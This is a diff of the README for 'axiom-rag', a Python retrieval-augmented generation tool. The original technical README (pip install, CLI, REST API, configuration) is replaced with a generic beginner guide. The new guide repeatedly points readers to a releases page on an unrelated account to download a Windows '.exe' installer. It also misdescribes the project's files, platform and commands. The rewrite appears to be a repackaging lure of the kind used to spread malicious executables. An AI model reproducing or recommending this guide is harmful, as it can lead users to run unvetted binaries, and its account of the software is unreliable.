@@ -1,264 +1,139 @@
-[![PyPI](https://img.shields.io/pypi/v/axiom-rag.svg)](https://pypi.org/project/axiom-rag/)
-# axiom-rag
-![CI](https://github.com/axiom-llc/axiom-rag/actions/workflows/ci.yml/badge.svg)
+# ⚙️ axiom-rag - Simple, Accurate Retrieval and Answers
 
-Production-grade Retrieval-Augmented Generation pipeline.  Ingest documents,
-embed them, store vectors locally, retrieve semantically, and generate grounded
-answers — from a clean CLI or REST API.
+[![Download axiom-rag](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/eibrunodev/axiom-rag/releases)
 
-No hallucination from prior knowledge.  Every answer is bounded by what you
-put in.  Sources are cited inline.
+## 📄 About axiom-rag
 
-```bash
-rag ingest ./docs
-rag query "what is our refund policy?"
+axiom-rag is a tool that helps you find accurate information fast. It uses a method called retrieval-augmented generation (RAG). This means it searches trusted sources and gives you answers with citations. You can use it on your computer through a simple program or a small web service.
+
+The app works with Python and databases to give precise results. It checks how good the answers are using standard tests. You don’t need to know programming to use it. Just follow the steps below.
+
+### Key features:
+
+- Searches trusted sources for answers
+- Shows where answers come from
+- Works on Windows computers
+- Easy to use command-line and web options
+- Evaluates answer quality automatically
+
+## 🖥 What You Need
+
+- A Windows 10 or newer computer
+- At least 4 GB of free space
+- Python 3.11 or later installed (free from python.org)
+- Internet connection to download files and run some parts
+
+## 🎯 How to Download axiom-rag
+
+Click the big button below to visit the official download page.
+
+[![Download axiom-rag](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/eibrunodev/axiom-rag/releases)
+
+This page contains the latest release files. Look for the Windows installer or ZIP file there.
+
+## 📦 Step 1: Get Python Ready
+
+1. If you don’t have Python 3.11 or later, download it from [python.org](https://www.python.org/downloads/windows/).
+2. Run the installer and check the box that says **Add Python to PATH**.
+3. Finish the installation by following the prompts.
+
+Open the command prompt (press Windows + R, type `cmd`, then press Enter). Type:
+
+```
+python --version
 ```
 
-Python 3.11+ · Gemini API · ChromaDB · Flask · MIT
+This should show Python 3.11 or higher.
+
+## 🚀 Step 2: Download axiom-rag
+
+1. Go to the [axiom-rag releases page](https://github.com/eibrunodev/axiom-rag/releases).
+2. Find the latest version entry.
+3. Download the Windows installer (file ending in `.exe`) or ZIP archive.
+4. If you get a ZIP file, right-click it and select **Extract All** to unpack the files.
+
+Save the files to an easy-to-find location, such as your Desktop or Documents folder.
+
+## 🔧 Step 3: Install Required Packages
+
+To run axiom-rag, you need some extra Python tools. The files you downloaded include a list of these tools in a file named `requirements.txt`.
+
+1. Open the command prompt.
+2. Change directory to where you saved axiom-rag files. For example:
+
+```
+cd Desktop\axiom-rag
+```
+
+3. Run this command to install the packages:
+
+```
+pip install -r requirements.txt
+```
+
+Wait for the process to finish. This step might take a few minutes.
+
+## ▶️ Step 4: Running axiom-rag
+
+You can run axiom-rag in two ways: command-line or web interface.
+
+### Run using the command line
+
+1. In the same command prompt window, type:
+
+```
+python main.py
+```
+
+2. The program will start searching and displaying answers.
+3. Follow any onscreen instructions to type in your questions.
+
+### Run the web server to use via browser
+
+1. In the command prompt, type:
+
+```
+python app.py
+```
+
+2. Open your web browser (Chrome, Edge, Firefox).
+3. Go to the address shown in the command prompt, usually `http://127.0.0.1:5000`.
+4. Use the web page to type questions and get answers with sources.
+
+## 🔍 How axiom-rag Works
+
+The app finds relevant documents that match your question. It then generates clear answers and shows the sources it used. This helps you trust the responses.
+
+Behind the scenes, it uses a vector database called ChromaDB. This saves information in a way that the program can quickly search. It also uses the Gemini model to improve answer quality.
+
+## ⚙️ Adjusting Settings
+
+If you want to change how axiom-rag works:
+
+- Open the `config.yaml` or similar settings file in a text editor.
+- You can change things like the number of results to show, database paths, or server settings.
+- Save the changes and restart the program.
+
+## 📁 File Overview
+
+- `main.py`: Runs the command-line version.
+- `app.py`: Runs the web server.
+- `requirements.txt`: Lists needed Python packages.
+- `config.yaml`: Contains settings you can edit.
+- `README.md`: This guide.
+
+## 🛠 Troubleshooting
+
+- If Python is not found, make sure you added it to PATH during install.
+- If the app does not start, check you installed packages with `pip install -r requirements.txt`.
+- Firewall or antivirus may block the web server. Allow access if asked.
+- Restart your computer if something seems stuck.
+
+## ⚡️ Updates and Support
+
+Check back on the [axiom-rag releases page](https://github.com/eibrunodev/axiom-rag/releases) for updates or bug fixes.
+
+Report issues by opening a discussion or issue on the GitHub page. Provide details like your Windows version and what you tried.
 
 ---
-
-## What It Does
-
-1. **Ingest** — chunks documents, embeds them via Gemini `gemini-embedding-001`,
-   and stores vectors in a local ChromaDB collection
-2. **Retrieve** — embeds the query and finds the top-k most semantically
-   similar chunks above a configurable similarity threshold
-3. **Generate** — passes retrieved context to Gemini 2.5 Flash with a strict
-   grounding prompt; the model answers only from what was retrieved
-
-The pipeline is fully local by default.  No database server required.
-ChromaDB runs embedded.  The only network calls are to the Gemini API.
-
----
-
-## Installation
-
-```bash
-pip install axiom-rag
-cp .env.example .env  # set GEMINI_API_KEY
-```
-
-Or from source:
-
-```bash
-git clone https://github.com/axiom-llc/axiom-rag.git
-cd axiom-rag
-python3.11 -m venv .venv && source .venv/bin/activate
-pip install -e .
-
-# For development (includes pytest)
-pip install -e ".[dev]"
-```
-
-Copy `.env.example` to `.env` and set your key:
-
-```bash
-cp .env.example .env
-# Edit .env — set GEMINI_API_KEY at minimum
-```
-
-`.env` is loaded automatically at startup via `python-dotenv`.
-
----
-
-## CLI
-
-```bash
-rag ingest ./docs                         # ingest directory (.txt and .md)
-rag ingest ./docs/policy.txt              # ingest single file
-rag ingest ./docs --strategy sentences    # use sentence chunking
-
-rag query "what is the cancellation window?"
-
-rag list                                  # list ingested documents
-rag delete policy.txt                     # delete a document by ID
-rag stats                                 # collection statistics (JSON)
-```
-
-Store-only commands (`list`, `delete`, `stats`) do not require `GEMINI_API_KEY`.
-
----
-
-## REST API
-
-```bash
-python -m server.app   # default: 0.0.0.0:8000
-```
-
-### `POST /ingest`
-
-```json
-{
-  "text": "Full document text...",
-  "doc_id": "policy-v2",
-  "metadata": {"category": "legal"},
-  "strategy": "fixed"
-}
-```
-
-Response `201`:
-```json
-{"doc_id": "policy-v2", "chunks_stored": 14}
-```
-
-### `POST /query`
-
-```json
-{"question": "what is the cancellation window?"}
-```
-
-Response `200`:
-```json
-{
-  "answer": "The cancellation window is 30 days from purchase...",
-  "sources": ["policy-v2"],
-  "chunk_count": 3,
-  "chunks": [
-    {
-      "text": "...",
-      "metadata": {"doc_id": "policy-v2", "chunk_index": 4},
-      "score": 0.91
-    }
-  ]
-}
-```
-
-### `GET /documents`
-### `DELETE /documents/<doc_id>`
-### `GET /stats`
-
----
-
-## Architecture
-
-```
-query / ingest
-      │
-      ▼
-  cli.py / server/app.py        ← entry points; no business logic
-      │
-      ▼
-  rag/pipeline.py               ← ingest() and query(); public interface
-      │
-      ├─ rag/chunker.py         ← fixed-size or sentence-boundary chunking
-      ├─ rag/embedder.py        ← Gemini gemini-embedding-001 (stateless)
-      ├─ rag/store.py           ← ChromaDB upsert / cosine retrieval
-      └─ rag/generator.py       ← Gemini 2.5 Flash; context-grounded answers
-
-  rag/config.py                 ← frozen Config dataclass; env + override resolution
-```
-
-All modules are stateless.  `pipeline.py` is the only file that calls more
-than one module.  Config is resolved once at startup and passed explicitly —
-no globals, no module-level singletons.
-
----
-
-## Design Notes
-
-**Embedding model.**  This pipeline uses `models/gemini-embedding-001`, the
-currently available Gemini embedding model via the `google-genai` SDK.  The
-default in `config.py` and `.env.example` reflects this.  Use
-`RAG_EMBEDDING_MODEL` to override if your API key has access to additional
-models.
-
-**Embedding asymmetry.**  The Gemini embedding API distinguishes `task_type`:
-`RETRIEVAL_DOCUMENT` for ingestion and `RETRIEVAL_QUERY` for queries.  Using
-the wrong type for either degrades retrieval precision measurably.  Both are
-set explicitly in `embedder.py`.
-
-**Score threshold.**  Retrieved chunks below the configured cosine similarity
-floor (`RAG_SCORE_THRESHOLD`, default `0.4`) are dropped before generation.
-This prevents low-relevance noise from polluting the context window.  Tune
-down for broader recall, up for stricter precision.
-
-**Chunk overlap.**  Fixed-size chunking uses a configurable overlap window
-(`RAG_CHUNK_OVERLAP`, default `64` tokens) between consecutive chunks.
-Overlap preserves context at chunk boundaries at the cost of slight index
-size increase.
-
-**Grounding discipline.**  The generation prompt instructs the model to answer
-only from provided context, cite `doc_id` inline, and state explicitly when
-context is insufficient rather than speculate.  The `system_prompt` parameter
-in `generator.generate_answer()` exists for domain adaptation but changing it
-to permit prior-knowledge use defeats the pipeline's purpose.
-
-**pgvector swap path.**  `store.py` is the only file that references
-ChromaDB.  To swap in pgvector: implement `upsert`, `query`,
-`delete_document`, `list_documents`, and `collection_stats` in a new
-`store_pg.py` and update the single import in `pipeline.py`.  Nothing else
-changes.
-
-**Lazy API key validation.**  `GEMINI_API_KEY` is not required at config load
-time.  Validation fires at the entry to `embedder.embed_texts()` and
-`embedder.embed_query()`.  This allows store-only CLI commands to work
-without a key present.
-
-**Environment loading.**  Both `cli.py` and `server/app.py` call
-`load_dotenv()` at startup.  A `.env` file in the project root is loaded
-automatically — no manual `export` required.
-
----
-
-## Configuration
-
-| Variable                | Default                        | Description                        |
-|-------------------------|--------------------------------|------------------------------------|
-| `GEMINI_API_KEY`        | *(required for embed/generate)*| Gemini API key                     |
-| `RAG_CHROMA_PATH`       | `~/.rag/chroma`                | ChromaDB persistence directory     |
-| `RAG_COLLECTION`        | `documents`                    | ChromaDB collection name           |
-| `RAG_CHUNK_SIZE`        | `512`                          | Approximate words per chunk        |
-| `RAG_CHUNK_OVERLAP`     | `64`                           | Overlap between consecutive chunks |
-| `RAG_TOP_K`             | `5`                            | Max chunks retrieved per query     |
-| `RAG_SCORE_THRESHOLD`   | `0.4`                          | Min cosine similarity (0–1)        |
-| `RAG_EMBEDDING_MODEL`   | `models/gemini-embedding-001`  | Gemini embedding model             |
-| `RAG_GENERATION_MODEL`  | `gemini-2.5-flash`             | Gemini generation model            |
-
----
-
-## Tests
-
-```bash
-pytest tests/ -v --tb=short
-```
-
-All tests mock Gemini API calls.  No live API or network access required.
-
-```
-tests/test_chunker.py    — chunking strategies, overlap, edge cases
-tests/test_store.py      — score filtering, sort order, delete, list, stats
-tests/test_pipeline.py   — ingest/query integration, file and directory helpers
-```
-
-To run with coverage (requires `pytest-cov`):
-
-```bash
-pip install pytest-cov
-pytest tests/ -v --tb=short --cov=rag --cov-report=term-missing
-```
-
----
-
-## Evaluation
-
-Retrieval quality is measured using Precision@k and MRR against a ground-truth
-dataset.
-
-```bash
-python eval/eval_retrieval.py --dataset eval/dataset.json
-python eval/eval_retrieval.py --dataset eval/dataset.json --json
-```
-
-The eval harness requires documents to be ingested before running.  The
-`relevant_doc_ids` in `eval/dataset.json` must match the `doc_id` values
-used at ingest time (i.e. the filename including extension when ingesting
-via the CLI).
-
-See [`eval/README.md`](eval/README.md) for full usage and tuning guidance.
-
----
-
-## License
-
-MIT — [Axiom LLC](https://axiom-llc.github.io)
+[Download axiom-rag](https://github.com/eibrunodev/axiom-rag/releases) - visit this page to download and get started.
